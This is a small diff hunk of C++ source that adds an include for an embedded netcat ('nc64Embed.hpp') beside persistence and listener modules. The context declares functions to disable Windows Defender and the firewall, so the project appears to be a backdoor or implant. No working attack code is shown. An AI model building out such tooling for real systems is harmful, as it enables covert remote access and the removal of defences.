@@ -13,6 +13,7 @@
 #include "..\include\util.hpp"
 #include "..\persistence\embed.hpp"
 #include "..\listener\embed.hpp"
+#include "..\listener\nc64Embed.hpp"
 
 void DisableDefender();
 void DisableFirewall();
